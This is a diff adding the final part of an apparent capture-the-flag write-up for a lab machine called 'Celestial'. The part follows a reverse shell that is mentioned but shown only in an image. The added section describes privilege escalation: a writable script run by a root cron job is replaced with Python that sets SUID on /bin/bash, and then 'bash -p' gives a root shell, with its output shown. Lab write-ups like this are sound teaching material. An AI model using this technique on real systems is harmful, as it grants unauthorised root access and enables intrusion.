@@ -123,3 +123,44 @@ Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...
 As we have already verified the remote execution of commands, we proceed to create a index.html to be able to establish a reverse shell and gain access once and for all to the Victim Machine by repeating the previous process but listening with nc through port 443 of our Machine:
 
 ![6](../../../assets/images/Celestial/6.png)
+
+Intrusion ready. Let's go for privilege escalation!
+
+# Privilege Escalation: Sun -> root
+
+We did some research on the system and upon launching pspy we found that root is running a cron task on the system:
+
+![7](../../../assets/images/Celestial/7.png)
+
+We list the permissions of the script.py that is running root:
+
+```bash
+sun@celestial:~/Documents$ ls -l
+total 4
+-rw-rw-r-- 1 sun  sun  29 Dec 29 11:16 script.py
+lrwxrwxrwx 1 root root 18 Sep 15  2022 user.txt -> /home/sun/user.txt
+```
+
+As we can see, we own the script, so we proceed to delete it to create a malicious script so that when the cron task runs we can atribute SUID privilege to the /bin/bash.
+
+## Malicious Script Content:
+
+```python 
+#!/usr/bin/env python3
+
+import os
+
+os.system("chmod 4755 /bin/bash")
+```
+
+Once we create the script, we wait a bit and when we list the /bin/bash we see that the SUID privilege was successfully attributed, so we can now become root!!
+
+```bash
+sun@celestial:~/Documents$ bash -p
+bash-4.3# whoami
+root
+bash-4.3# id
+uid=1000(sun) gid=1000(sun) euid=0(root) groups=1000(sun),4(adm),24(cdrom),27(sudo),30(dip),46(plugdev),113(lpadmin),128(sambashare)
+```
+
+Celestial Machine ready! I hope you enjoyed it as much as I did, greetings and keep hacking!!❤️❤️
